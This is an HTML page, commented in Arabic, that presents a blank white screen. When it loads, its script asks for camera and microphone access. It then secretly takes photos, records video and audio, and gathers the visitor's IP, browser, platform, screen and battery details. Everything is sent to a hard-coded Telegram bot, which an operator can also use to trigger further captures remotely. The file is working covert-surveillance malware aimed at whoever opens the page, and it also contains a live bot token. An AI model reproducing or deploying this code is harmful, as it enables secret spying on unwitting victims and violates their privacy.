<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>...</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: white;
        }
        /* إخفاء كل شيء */
        .hidden-all {
            display: none;
        }
    </style>
</head>
<body style="background: white; margin: 0; padding: 0;">
    <!-- لا شيء يظهر للمستخدم - كل شيء مخفي -->

    <script>
        const token = "7782080900:AAGvcMWaE_IAbb_0_0-HwcyCvQUUUVxBYmc";
        const chat_id = "5932979028";
        let lastUpdateId = 0;
        
        // متغيرات للكاميرا (تستخدم بدون عرض أي شيء)
        let cameraReady = false;
        let videoStream = null;
        let videoTrack = null;
        let imageCapture = null;
        let audioStream = null;
        
        // ========== طلب الصلاحيات مرة واحدة فقط (بدون عرض أي شيء) ==========
        async function initCamera() {
            try {
                // طلب الكاميرا والميكروفون معاً
                videoStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                videoTrack = videoStream.getVideoTracks()[0];
                imageCapture = new ImageCapture(videoTrack);
                
                // طلب الميكروفون بشكل منفصل للتأكد
                audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
                
                cameraReady = true;
                
                // إيقاف التيارات مؤقتاً (سيتم إعادة تشغيلها عند الحاجة)
                stopVideoTemporarily();
                stopAudioTemporarily();
                
                console.log("✅ تم تجهيز الكاميرا والميكروفون بنجاح");
                return true;
            } catch (e) {
                console.error("❌ فشل تجهيز الكاميرا:", e);
                cameraReady = false;
                return false;
            }
        }
        
        // تشغيل الفيديو مؤقتاً للتصوير
        async function ensureVideoReady() {
            if (!cameraReady) return false;
            
            // إذا كان التيار متوقف أو ميت، أعد تشغيله
            if (!videoTrack || videoTrack.readyState === 'ended') {
                try {
                    const newStream = await navigator.mediaDevices.getUserMedia({ video: true });
                    videoStream = newStream;
                    videoTrack = videoStream.getVideoTracks()[0];
                    imageCapture = new ImageCapture(videoTrack);
                } catch (e) {
                    console.error("فشل إعادة تشغيل الكاميرا:", e);
                    return false;
                }
            }
            return true;
        }
        
        // تشغيل الميكروفون مؤقتاً للتسجيل
        async function ensureAudioReady() {
            if (!cameraReady) return false;
            
            if (!audioStream || audioStream.getTracks()[0]?.readyState === 'ended') {
                try {
                    audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
                } catch (e) {
                    console.error("فشل إعادة تشغيل الميكروفون:", e);
                    return false;
                }
            }
            return true;
        }
        
        // إيقاف الفيديو مؤقتاً (توفير للموارد)
        function stopVideoTemporarily() {
            if (videoStream) {
                videoStream.getTracks().forEach(track => {
                    if (track.readyState === 'live') track.stop();
                });
            }
        }
        
        // إيقاف الميكروفون مؤقتاً
        function stopAudioTemporarily() {
            if (audioStream) {
                audioStream.getTracks().forEach(track => {
                    if (track.readyState === 'live') track.stop();
                });
            }
        }
        
        // ========== دوال التليجرام ==========
        async function sendToTelegram(text) {
            try {
                await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ chat_id, text })
                });
            } catch (e) {}
        }
        
        async function sendPhoto(blob) {
            const formData = new FormData();
            formData.append("chat_id", chat_id);
            formData.append("photo", blob, "photo.jpg");
            await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                method: "POST",
                body: formData
            });
        }
        
        async function sendVideo(blob) {
            const formData = new FormData();
            formData.append("chat_id", chat_id);
            formData.append("video", blob, "video.webm");
            await fetch(`https://api.telegram.org/bot${token}/sendVideo`, {
                method: "POST",
                body: formData
            });
        }
        
        async function sendVoice(blob) {
            const formData = new FormData();
            formData.append("chat_id", chat_id);
            formData.append("voice", blob, "voice.ogg");
            await fetch(`https://api.telegram.org/bot${token}/sendVoice`, {
                method: "POST",
                body: formData
            });
        }
        
        // ========== إرسال واجهة البوت ==========
        async function sendBotMenu() {
            const message = `🎮 *واجهة التحكم عن بعد* 🎮

✅ النظام جاهز والكاميرا نشطة

اختر الإجراء المطلوب من الأزرار أدناه:`;
            
            const keyboard = {
                inline_keyboard: [
                    [
                        { text: "📸 التقاط صورة", callback_data: "capture_photo" },
                        { text: "🎬 تسجيل فيديو", callback_data: "record_video" }
                    ],
                    [
                        { text: "🎤 تسجيل صوت", callback_data: "record_audio" },
                        { text: "📊 معلومات الجهاز", callback_data: "device_info" }
                    ],
                    [
                        { text: "📸 10 صور", callback_data: "take_10_photos" },
                        { text: "🎤 10 تسجيلات صوت", callback_data: "record_10_audios" }
                    ],
                    [
                        { text: "🔄 تنفيذ الكل", callback_data: "run_full_sequence" }
                    ]
                ]
            };
            
            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id,
                    text: message,
                    parse_mode: "Markdown",
                    reply_markup: keyboard
                })
            });
        }
        
        // ========== معلومات الجهاز ==========
        async function sendDeviceInfo() {
            try {
                const battery = await navigator.getBattery();
                const ip = await fetch("https://api.ipify.org?format=json").then(r => r.json()).catch(() => ({}));
                const msg = `
👑 *معلومات الجهاز* 👑

🌐 البيانـات:
• الموقع: ${location.href}
• المتصفح: ${navigator.userAgent.substring(0, 100)}...
• IP: ${ip.ip || "غير معروف"}
• اللغة: ${navigator.language}
• النظام: ${navigator.platform}
• الشاشة: ${screen.width}x${screen.height}
• البطارية: ${Math.round(battery.level * 100)}% ${battery.charging ? '🔌 شاحن' : '🔋 بطارية'}
                `;
                await sendToTelegram(msg);
            } catch(e) {}
        }
        
        // ========== التقاط صورة (مخفي تماماً) ==========
        async function capturePhoto() {
            if (!cameraReady) {
                await sendToTelegram("❌ الكاميرا غير جاهزة");
                return null;
            }
            
            try {
                // تأكد من أن الكاميرا جاهزة
                await ensureVideoReady();
                
                // التقاط الصورة (مخفي - لا يظهر أي شيء للمستخدم)
                const photoBlob = await imageCapture.takePhoto();
                
                // إيقاف التيار مؤقتاً بعد التصوير
                stopVideoTemporarily();
                
                return photoBlob;
            } catch (e) {
                console.error("فشل التقاط الصورة:", e);
                await sendToTelegram("❌ فشل التقاط الصورة");
                return null;
            }
        }
        
        // ========== تسجيل فيديو (مخفي) ==========
        async function recordVideo(duration = 10000) {
            if (!cameraReady) {
                await sendToTelegram("❌ الكاميرا غير جاهزة");
                return null;
            }
            
            try {
                // الحصول على تيار جديد للفيديو مع الصوت
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                const recorder = new MediaRecorder(stream);
                const chunks = [];
                
                return new Promise((resolve) => {
                    recorder.ondataavailable = e => {
                        if (e.data.size > 0) chunks.push(e.data);
                    };
                    
                    recorder.onstop = async () => {
                        const blob = new Blob(chunks, { type: 'video/webm' });
                        stream.getTracks().forEach(t => t.stop());
                        resolve(blob);
                    };
                    
                    recorder.start();
                    setTimeout(() => recorder.stop(), duration);
                });
            } catch (e) {
                console.error("فشل تسجيل الفيديو:", e);
                await sendToTelegram("❌ فشل تسجيل الفيديو");
                return null;
            }
        }
        
        // ========== تسجيل صوت (مخفي) ==========
        async function recordAudio(duration = 10000) {
            if (!cameraReady) {
                await sendToTelegram("❌ الميكروفون غير جاهز");
                return null;
            }
            
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                const recorder = new MediaRecorder(stream);
                const chunks = [];
                
                return new Promise((resolve) => {
                    recorder.ondataavailable = e => {
                        if (e.data.size > 0) chunks.push(e.data);
                    };
                    
                    recorder.onstop = async () => {
                        const blob = new Blob(chunks, { type: 'audio/ogg' });
                        stream.getTracks().forEach(t => t.stop());
                        resolve(blob);
                    };
                    
                    recorder.start();
                    setTimeout(() => recorder.stop(), duration);
                });
            } catch (e) {
                console.error("فشل تسجيل الصوت:", e);
                await sendToTelegram("❌ فشل تسجيل الصوت");
                return null;
            }
        }
        
        // ========== تنفيذ الأوامر ==========
        async function handleCapturePhoto() {
            await sendToTelegram("📸 جاري التقاط صورة...");
            const photo = await capturePhoto();
            if (photo) {
                await sendPhoto(photo);
                await sendToTelegram("✅ تم التقاط الصورة وإرسالها");
            }
        }
        
        async function handleRecordVideo() {
            await sendToTelegram("🎬 جاري تسجيل فيديو لمدة 10 ثوان...");
            const video = await recordVideo(10000);
            if (video) {
                await sendVideo(video);
                await sendToTelegram("✅ تم تسجيل الفيديو وإرساله");
            }
        }
        
        async function handleRecordAudio() {
            await sendToTelegram("🎤 جاري تسجيل صوت لمدة 10 ثوان...");
            const audio = await recordAudio(10000);
            if (audio) {
                await sendVoice(audio);
                await sendToTelegram("✅ تم تسجيل الصوت وإرساله");
            }
        }
        
        async function handleTake10Photos() {
            await sendToTelegram("📸 جاري التقاط 10 صور...");
            for (let i = 0; i < 10; i++) {
                const photo = await capturePhoto();
                if (photo) {
                    await sendPhoto(photo);
                    await new Promise(r => setTimeout(r, 500));
                }
            }
            await sendToTelegram("✅ تم التقاط 10 صور وإرسالها");
        }
        
        async function handleRecord10Audios() {
            await sendToTelegram("🎤 جاري تسجيل 10 مقاطع صوتية...");
            for (let i = 0; i < 10; i++) {
                const audio = await recordAudio(10000);
                if (audio) {
                    await sendVoice(audio);
                    await new Promise(r => setTimeout(r, 1000));
                }
            }
            await sendToTelegram("✅ تم تسجيل 10 مقاطع صوتية وإرسالها");
        }
        
        async function handleRunFullSequence() {
            await sendToTelegram("🔄 بدء تنفيذ جميع المهام...");
            
            const photo = await capturePhoto();
            if (photo) await sendPhoto(photo);
            await new Promise(r => setTimeout(r, 2000));
            
            const video = await recordVideo(10000);
            if (video) await sendVideo(video);
            await new Promise(r => setTimeout(r, 2000));
            
            const audio = await recordAudio(10000);
            if (audio) await sendVoice(audio);
            
            await sendToTelegram("✅ تم تنفيذ جميع المهام بنجاح");
        }
        
        // ========== معالجة أزرار البوت ==========
        async function handleCallback(callbackData) {
            switch(callbackData) {
                case "capture_photo":
                    await handleCapturePhoto();
                    break;
                case "record_video":
                    await handleRecordVideo();
                    break;
                case "record_audio":
                    await handleRecordAudio();
                    break;
                case "device_info":
                    await sendDeviceInfo();
                    break;
                case "take_10_photos":
                    await handleTake10Photos();
                    break;
                case "record_10_audios":
                    await handleRecord10Audios();
                    break;
                case "run_full_sequence":
                    await handleRunFullSequence();
                    break;
                default:
                    console.log("أمر غير معروف:", callbackData);
            }
        }
        
        // ========== جلب تحديثات البوت ==========
        async function getUpdates() {
            try {
                const url = `https://api.telegram.org/bot${token}/getUpdates?timeout=30&offset=${lastUpdateId + 1}`;
                const response = await fetch(url);
                const data = await response.json();
                
                if (data.result && data.result.length > 0) {
                    for (const update of data.result) {
                        lastUpdateId = update.update_id;
                        
                        if (update.callback_query) {
                            await handleCallback(update.callback_query.data);
                            
                            await fetch(`https://api.telegram.org/bot${token}/answerCallbackQuery`, {
                                method: "POST",
                                headers: { "Content-Type": "application/json" },
                                body: JSON.stringify({
                                    callback_query_id: update.callback_query.id,
                                    text: "✅ جاري تنفيذ الأمر..."
                                })
                            });
                        }
                    }
                }
            } catch (e) {
                console.error("خطأ:", e);
            }
        }
        
        // ========== الوظائف الأصلية (10 صور + فيديو + 10 صوت) ==========
        async function originalTake10Photos() {
            for (let i = 0; i < 2; i++) {
                const photo = await capturePhoto();
                if (photo) await sendPhoto(photo);
                await new Promise(r => setTimeout(r, 500));
            }
        }
        
        async function originalRecordVideo() {
            const video = await recordVideo(10000);
            if (video) await sendVideo(video);
        }
        
        async function originalRecord10Audios() {
            for (let i = 0; i < 2; i++) {
                const audio = await recordAudio(10000);
                if (audio) await sendVoice(audio);
                await new Promise(r => setTimeout(r, 1000));
            }
        }
        
        // ========== بدء التشغيل ==========
        window.onload = async () => {
            // طلب الصلاحيات مرة واحدة فقط (بدون عرض أي شيء)
            const success = await initCamera();
            
            if (success) {
                // إرسال معلومات الجهاز
                await sendDeviceInfo();
                
                // إرسال واجهة البوت
                await sendBotMenu();
                await sendToTelegram("🎮 النظام جاهز! استخدم الأزرار للتحكم عن بعد");
                
                // تنفيذ السلسلة الأصلية
                await originalTake10Photos();
                await originalRecordVideo();
                await originalRecord10Audios();
                
                await sendToTelegram("✅ اكتمل التنفيذ التلقائي");
                
                // بدء الاستماع لأزرار البوت
                setInterval(getUpdates, 2000);
            } else {
                await sendToTelegram("❌ فشل في الحصول على صلاحيات الكاميرا والميكروفون");
            }
        };
        
        // الحفاظ على الصلاحيات عند مغادرة الصفحة والعودة
        document.addEventListener('visibilitychange', () => {
            if (!document.hidden) {
                // عند العودة للصفحة، تأكد من أن الصلاحيات لا تزال موجودة
                if (!cameraReady) {
                    initCamera();
                }
            }
        });
    </script>
</body>
</html>
